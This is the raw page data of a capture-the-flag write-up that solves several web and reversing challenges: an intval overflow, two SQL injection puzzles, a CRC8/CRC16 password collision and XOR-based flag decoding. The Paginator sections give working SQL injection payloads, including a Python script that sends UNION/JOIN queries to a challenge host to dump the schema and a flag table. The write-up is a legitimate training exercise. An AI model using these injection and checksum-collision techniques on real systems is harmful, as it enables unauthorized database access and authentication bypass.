        <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span>
        <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xF3</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> crc<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch<span class="token operator">:</span>str<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        crc<span class="token operator">=</span>crc8table<span class="token punctuation">[</span>crc<span class="token operator">^</span>ch<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> crc<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">crc16</span><span class="token punctuation">(</span>string str<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> crc<span class="token operator">=</span><span class="token number">0xFFFF</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch<span class="token operator">:</span>str<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        crc<span class="token operator">^=</span>ch<span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>crc<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> crc<span class="token operator">=</span><span class="token punctuation">(</span>crc<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xA001</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> crc<span class="token operator">>>=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> crc<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    string target<span class="token operator">=</span><span class="token string">"AdM1nP@assW0rd!"</span><span class="token punctuation">;</span>
    cout<span class="token operator">&lt;&lt;</span><span class="token function">crc8</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token char">' '</span><span class="token operator">&lt;&lt;</span><span class="token function">crc16</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">65536</span><span class="token operator">*</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">// brute force</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">sprintf</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token string">"abcde%010d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">crc8</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">crc8</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">crc16</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">crc16</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            cout<span class="token operator">&lt;&lt;</span>password<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
19:T12ad,expected <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span>
    <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span>
    <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span>
    <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x42</span>
<span class="token punctuation">]</span>


<span class="token comment"># e = flag[i] ^ 0x5A + i</span>
<span class="token comment"># expected[i] = (e >> 5) | (e &lt;&lt; 3)</span>

<span class="token keyword">def</span> <span class="token function">rrot3</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>expected<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    b1 <span class="token operator">=</span> rrot3<span class="token punctuation">(</span>expected<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    b2 <span class="token operator">=</span> b1 <span class="token operator">-</span> i
    b3 <span class="token operator">=</span> b2 <span class="token operator">^</span> <span class="token number">0x5A</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>b3<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
1a:Tf20,<span class="token keyword">def</span> <span class="token function">hex_string_to_byte_list</span><span class="token punctuation">(</span>hexstr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hexstr<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span>
    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>hexstr<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hexstr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>


result <span class="token operator">=</span> hex_string_to_byte_list<span class="token punctuation">(</span><span class="token string">"1e78197567121966196e757e1f69781e1e1f7e736d6d1f75196e75191b646e196f6465510b0b0b57"</span><span class="token punctuation">)</span>

prefix <span class="token operator">=</span> <span class="token string">"ENO{"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>prefix<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 91 54 86 14</span>
<span class="token comment"># 34 92 86 29</span>
<span class="token comment"># 92 32 58 5</span>
<span class="token comment"># 90 39 55 101</span>
<span class="token comment"># 91 81 49 8</span>
<span class="token comment"># 40 35 80 14</span>
<span class="token comment"># 92 32 58 98</span>
<span class="token comment"># 94 42 33 98</span>
<span class="token comment"># 42 42 42 42    &lt;- leak key!!</span>
<span class="token comment"># 78 69 68 44</span>
1b:T6b4,key <span class="token operator">=</span> <span class="token number">42</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 4R3_</span>
<span class="token comment"># M83L</span>
<span class="token comment"># 3D_T</span>
<span class="token comment"># 5CR4</span>
<span class="token comment"># 45TY</span>
<span class="token comment"># GG5_</span>
<span class="token comment"># 3D_3</span>
<span class="token comment"># 1ND3</span>
<span class="token comment"># ENO{</span>
<span class="token comment"># !!!}</span>
5:[["$","h2",null,{"className":"x-h1","children":"Web"}],["$","h3",null,{"className":"x-h2","children":"Numberizer"}],["$","h4",null,{"className":"x-h3","children":"Challenge Source"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$f"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Solution"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">num1</code>: <code class=\"x-inline-highlight\">9e99</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">num2</code>: <code class=\"x-inline-highlight\">1</code>"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Flag"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ENO{INTVAL_IS_NOT_ALW4S_P0S1TiV3!}"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Paginator"}],["$","h4",null,{"className":"x-h3","children":"Challenge Source"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$11"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$12"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Solution"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The payload is <code class=\"x-inline-highlight\">/?p=2,10%20or%201=1</code> (<code class=\"x-inline-highlight\">/?p=2,10 or 1=1</code>)."}}],["$","h4",null,{"className":"x-h3","children":"Flag"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow!}"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Paginator V2"}],["$","h4",null,{"className":"x-h3","children":"Challenge Source"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$13"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$14"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Solution"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The SQL injection method is the same as the Paginator challenge. However, note that the following statement will only take the first two values separated by a comma:"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"[$min, $max] = explode(\",\",$_GET['p']);"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token punctuation\">[</span><span class=\"token variable\">$min</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$max</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\",\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'p'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"So we need to use <code class=\"x-inline-highlight\">join</code> in the following exploits."}}],["$","div",null,{"className":"x-divider"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"This is a SQLite3 database, so firstly we leak the table name by:"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"import requests\nurl = \"http://52.59.124.14:5015/?p=2,10 \"\npayload = \"union select * from (select 1)A join (select 2)B join (select sql from sqlite_master)C\"\nresp = requests.get(url + payload)\nprint(resp.text)\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token keyword\">import</span> requests\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://52.59.124.14:5015/?p=2,10 \"</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"union select * from (select 1)A join (select 2)B join (select sql from sqlite_master)C\"</span>\nresp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The response is:"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"2 (ID=1) has content: \"\"\n2 (ID=1) has content: \"CREATE TABLE flag (id INTEGER PRIMARY KEY, name TEXT UNIQUE, value TEXT)\"\n2 (ID=1) has content: \"CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)\"\nPage 2 (ID=2) has content: \"This is not a flag, but just a boring page.\"\nPage 3 (ID=3) has content: \"This is not a flag, but just a boring page.\"\n...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"2 (ID=1) has content: \"\"\n2 (ID=1) has content: \"CREATE TABLE flag (id INTEGER PRIMARY KEY, name TEXT UNIQUE, value TEXT)\"\n2 (ID=1) has content: \"CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)\"\nPage 2 (ID=2) has content: \"This is not a flag, but just a boring page.\"\nPage 3 (ID=3) has content: \"This is not a flag, but just a boring page.\"\n...\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"And then we can get the flag by changing the payload to:"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"payload = \"union select * from (select 1)A join (select 2)B join (select value from flag)C\"\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"payload <span class=\"token operator\">=</span> <span class=\"token string\">\"union select * from (select 1)A join (select 2)B join (select value from flag)C\"</span>\n"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The response is:"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"2 (ID=1) has content: \"RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ==\"\nPage 2 (ID=2) has content: \"This is not a flag, but just a boring page.\"\nPage 3 (ID=3) has content: \"This is not a flag, but just a boring page.\"\n...\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"2 (ID=1) has content: \"RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ==\"\nPage 2 (ID=2) has content: \"This is not a flag, but just a boring page.\"\nPage 3 (ID=3) has content: \"This is not a flag, but just a boring page.\"\n...\n"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Flag"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ENO{SQL1_W1th_0uT_C0mm4_W0rks_SomeHow_AgA1n_And_Ag41n!}"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Craphp"}],["$","h4",null,{"className":"x-h3","children":"Challenge Source"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$15"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$16"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Solution"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The challenge provides two functions in PHP, <code class=\"x-inline-highlight\">crc8</code> and <code class=\"x-inline-highlight\">crc16</code>. We need to find a string <code class=\"x-inline-highlight\">$password</code>, such that:"}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">$password != \"AdM1nP@assW0rd!\"</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">crc8($password) == crc8(\"AdM1nP@assW0rd!\")</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">crc16($password) == crc16(\"AdM1nP@assW0rd!\")</code>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">strlen($password) == strlen(\"AdM1nP@assW0rd!\")</code>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The <code class=\"x-inline-highlight\">crc16</code> checksum has <code class=\"x-inline-highlight\">65536</code> possible values, and the <code class=\"x-inline-highlight\">crc8</code> checksum has <code class=\"x-inline-highlight\">256</code> possible values. <code class=\"x-inline-highlight\">65536 * 256 = 16777216</code>, this is not a very large number, which allows us to brute force the result. I rewrite the script in C++."}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C++"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$17"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$18"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"We can obtain a password <code class=\"x-inline-highlight\">abcde0004936564</code> (not unique)."}}],["$","h4",null,{"className":"x-h3","children":"Flag"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ENO{Cr4hP_CRC_Collison_1N_P@ssw0rds!}}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ENO{Cr4hP_CRC_Collison_1N_P@ssw0rds!}}"}}]}]]}],["$","h2",null,{"className":"x-h1","children":"Reversing"}],["$","h3",null,{"className":"x-h2","children":"Flag Checker"}],["$","h4",null,{"className":"x-h3","children":"Solution"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"expected = [\n    0xF8, 0xA8, 0xB8, 0x21, 0x60, 0x73, 0x90, 0x83, 0x80, 0xC3,\n    0x9B, 0x80, 0xAB, 0x09, 0x59, 0xD3, 0x21, 0xD3, 0xDB, 0xD8,\n    0xFB, 0x49, 0x99, 0xE0, 0x79, 0x3C, 0x4C, 0x49, 0x2C, 0x29,\n    0xCC, 0xD4, 0xDC, 0x42\n]\n\n\n# e = flag[i] ^ 0x5A + i\n# expected[i] = (e >> 5) | (e << 3)\n\ndef rrot3(x):\n    return (x >> 3) | (x << 5) & 0xFF\n\n\nfor i in range(len(expected)):\n    b1 = rrot3(expected[i])\n    b2 = b1 - i\n    b3 = b2 ^ 0x5A\n    print(chr(b3), end=\"\")\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$19"}}]}]]}],["$","h4",null,{"className":"x-h3","children":"Flag"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"ENO{R3V3R53_3NG1N33R1NG_M45T3R!!!}"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"ENO{R3V3R53_3NG1N33R1NG_M45T3R!!!}"}}]}]]}],["$","h3",null,{"className":"x-h2","children":"Scrambled"}],["$","h4",null,{"className":"x-h3","children":"Solution"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"The chunk size is <code class=\"x-inline-highlight\">4</code>, and the flag starts with <code class=\"x-inline-highlight\">ENO{</code>. We can use this information to leak the key, which is <code class=\"x-inline-highlight\">42</code>."}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"def hex_string_to_byte_list(hexstr):\n    assert len(hexstr) % 2 == 0\n    return [int(hexstr[i:i + 2], 16) for i in range(0, len(hexstr), 2)]\n\n\nresult = hex_string_to_byte_list(\"1e78197567121966196e757e1f69781e1e1f7e736d6d1f75196e75191b646e196f6465510b0b0b57\")\n\nprefix = \"ENO{\"\nfor i in range(len(result)):\n    print(result[i] ^ ord(prefix[i % len(prefix)]), end=\" \")\n    if i % 4 == 3:\n        print()\n\n# 91 54 86 14\n# 34 92 86 29\n# 92 32 58 5\n# 90 39 55 101\n# 91 81 49 8\n# 40 35 80 14\n# 92 32 58 98\n# 94 42 33 98\n# 42 42 42 42    <- leak key!!\n# 78 69 68 44\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$1a"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"And then... Alright, I just combining these chunks together to make the flag read smoothly. The expected solution might be to leak the seed based on the position of the first chunk, and then obtain the correct order of the chunk sequence."}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Python"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"key = 42\n\nfor i in range(len(result)):\n    print(chr(result[i] ^ key), end=\"\")\n    if i % 4 == 3:\n        print()\n\n# 4R3_\n# M83L\n# 3D_T\n# 5CR4\n# 45TY\n# GG5_\n# 3D_3\n# 1ND3\n# ENO{\n# 